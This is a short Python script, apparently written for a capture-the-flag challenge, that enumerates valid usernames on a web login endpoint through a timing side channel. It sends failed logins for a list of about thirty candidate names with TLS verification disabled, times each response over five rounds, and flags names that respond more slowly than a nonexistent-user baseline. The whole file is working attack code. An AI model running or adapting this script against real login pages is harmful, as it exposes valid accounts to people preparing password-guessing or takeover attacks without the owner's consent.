import requests, time, statistics, sys
import urllib3
urllib3.disable_warnings()

BASE = "https://eci-2ze33laazlgmdj4q1hux.cloudeci1.ichunqiu.com:80"
LOGIN_URL = BASE + "/feed.php?route=/api/login"

CANDIDATES = ["staff","admin","alice","bob","charlie","editor","writer","author",
              "sysadmin","root","test","dave","erin","frank","grace","yactf",
              "cwp","webmaster","siteadmin","blogadmin","manager","owner","guest",
              "dev","deploy","operator","publisher","moderator","boss","chief"]

def t_request(u):
    t0 = time.time()
    try:
        requests.post(LOGIN_URL, data={"login": u, "pass": "WrongPass999"}, timeout=20, verify=False)
    except Exception:
        pass
    return time.time() - t0

def main():
    base_times = []
    results = {}
    for rnd in range(5):
        for u in CANDIDATES:
            t = t_request(u)
            results.setdefault(u, []).append(t)
            time.sleep(0.15)
        base_times.append(t_request("zzznonexist"))
        time.sleep(0.3)
    bmed = statistics.median(base_times)
    print(f"[*] baseline median: {bmed*1000:.0f}ms")
    ranked = sorted(results.items(), key=lambda kv: statistics.median(kv[1]), reverse=True)
    for u, ts in ranked:
        med = statistics.median(ts)
        flag = " <<<" if med > bmed + 0.045 else ""
        print(f"{u:14s} med={med*1000:6.0f}ms  min={min(ts)*1000:6.0f}ms  all={[round(x*1000) for x in ts]}{flag}")

main()
